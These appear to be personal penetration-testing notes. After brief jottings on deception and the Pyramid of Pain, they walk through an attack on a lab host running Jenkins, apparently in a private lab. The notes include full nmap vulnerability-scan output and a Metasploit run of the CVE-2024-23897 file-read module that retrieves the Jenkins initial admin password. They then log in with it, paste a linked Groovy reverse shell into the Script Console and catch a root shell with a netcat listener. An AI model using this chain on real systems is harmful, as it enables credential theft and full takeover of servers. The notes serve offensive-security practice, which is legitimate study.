# Pull before it gets taken down again:
[GitHub - BigBodyCobain/Shadowbroker: Open-source intelligence for the global theater. Track everything from the corporate/private jets of the wealthy, and spy satellites, to seismic events in one unified interface. Hook an AI agent up to have it parse through data and find previously unseen correlations. The knowledge is available to all but rarely aggregated in the open, until now. · GitHub](https://github.com/BigBodyCobain/Shadowbroker)

# Deception
human decision making cycle: 
	See, Think, Do
influence the cycle by following the cycle in reverse.
	- what do you want them to do?
	- what do they need think in order to follow through with it?
	- what do we have them see to trigger those thoughts?

# Pyramid of Pain
top - TTPs - 
middle - IPs - scanning
bottom - 
	Hashs - search for hash, use whitelsting
	IOCs -

# The Handoff Package
document the method for accessing the system well (msf payload, port, times, etc.)

---

# attacking a sliver server
```
──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sS -sC --script="vuln" 10.1.10.196           
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-08 10:46 -0400
Nmap scan report for 10.1.10.196
Host is up (0.00012s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE    SERVICE   VERSION
22/tcp   open     ssh       OpenSSH 10.2p1 Ubuntu 2ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:10.2p1: 
|       CVE-2026-35414  8.1     https://vulners.com/cve/CVE-2026-35414
|       CVE-2026-35386  8.1     https://vulners.com/cve/CVE-2026-35386
|       CVE-2026-35385  8.1     https://vulners.com/cve/CVE-2026-35385
|       CVE-2026-35387  6.5     https://vulners.com/cve/CVE-2026-35387
|_      CVE-2026-35388  2.5     https://vulners.com/cve/CVE-2026-35388
80/tcp   open     http      OpenResty web app server
|_http-server-header: openresty
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://www.securityfocus.com/bid/49303
|       https://www.tenable.com/plugins/nessus/55976
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
81/tcp   open     http      OpenResty web app server
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://www.securityfocus.com/bid/49303
|       https://www.tenable.com/plugins/nessus/55976
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 172.18.0.2
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: openresty
443/tcp  open     ssl/https openresty
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: openresty
5000/tcp filtered upnp
8080/tcp open     http      Jetty 10.0.18
|_http-server-header: Jetty(10.0.18)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /robots.txt: Robots file
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
MAC Address: 00:0C:29:44:71:1C (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.73 seconds

```

# Vulnerable jenkins instance
#### Console 1
```
msf auxiliary(gather/jenkins_cli_ampersand_arbitrary_file_read) > info

       Name: Jenkins cli Ampersand Replacement Arbitrary File Read
     Module: auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2024-01-24

Provided by:
  h00die
  Yaniv Nizry
  binganao
  h4x0r-dz
  Vozec

Module stability:
 crash-safe

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  FILE_PATH  /etc/passwd      yes       File path to read from the server
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4,
                                         socks5, socks5h, http
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasplo
                                        it.html
  RPORT      8080             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The base path for Jenkins
  VHOST                       no        HTTP server virtual host

Description:
  This module utilizes the Jenkins cli protocol to run the `help` command.
  The cli is accessible with read-only permissions by default, which are
  all thats required.

  Jenkins cli utilizes `args4j's` `parseArgument`, which calls `expandAtFiles` to
  replace any `@<filename>` with the contents of a file. We are then able to retrieve
  the error message to read up to the first two lines of a file.

  Exploitation by hand can be done with the cli, see markdown documents for additional
  instructions.

  There are a few exploitation oddities:
  1. The injection point for the `help` command requires 2 input arguments.
  When the `expandAtFiles` is called, each line of the `FILE_PATH` becomes an input argument.
  If a file only contains one line, it will throw an error: `ERROR: You must authenticate to access this Jenkins.`
  However, we can pad out the content by supplying a first argument.
  2. There is a strange timing requirement where the `download` (or first) request must get
  to the server first, but the `upload` (or second) request must be very close behind it.
  From testing against the docker image, it was found values between `.01` and `1.9` were
  viable. Due to the round trip time of the first request and response happening before
  request 2 would be received, it is necessary to use threading to ensure the requests
  happen within rapid succession.

  Files of value:
  * /var/jenkins_home/secret.key
  * /var/jenkins_home/secrets/master.key
  * /var/jenkins_home/secrets/initialAdminPassword
  * /etc/passwd
  * /etc/shadow
  * Project secrets and credentials
  * Source code, build artifacts

References:
  https://www.jenkins.io/security/advisory/2024-01-24/
  https://www.sonarsource.com/blog/excessive-expansion-uncovering-critical-security-vulnerabilities-in-jenkins/
  https://github.com/binganao/CVE-2024-23897
  https://github.com/h4x0r-dz/CVE-2024-23897
  https://github.com/Vozec/CVE-2024-23897
  https://nvd.nist.gov/vuln/detail/CVE-2024-23897


View the full module info with the info -d command.

msf auxiliary(gather/jenkins_cli_ampersand_arbitrary_file_read) > set RHOST 10.1.10.196
RHOST => 10.1.10.196
msf auxiliary(gather/jenkins_cli_ampersand_arbitrary_file_read) > set FILE_PATH /var/lib/jenkins/secrets/initialAdminPassword
FILE_PATH => /var/lib/jenkins/secrets/initialAdminPassword
msf auxiliary(gather/jenkins_cli_ampersand_arbitrary_file_read) > run
[*] Running module against 10.1.10.196
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Found exploitable version: 2.440
[*] Sending requests with UUID: f5e73944-040c-44d8-8086-e72527de3e8a
[*] Re-attempting with padding for single line output file
[+] /var/lib/jenkins/secrets/initialAdminPassword file contents retrieved (first line or 2):
c7637374312040a7b54bfe1a908848cf
[+] Results saved to: /home/kali/.msf4/loot/20260608125353_default_10.1.10.196_jenkins.file_919444.txt
[*] Auxiliary module execution completed

```

- Login to the site using admin and the found password
- Manage Jenkins > Script Console
	- https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
#### Console 2
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.1.10.56] from (UNKNOWN) [10.1.10.196] 53822
whoami
root
```
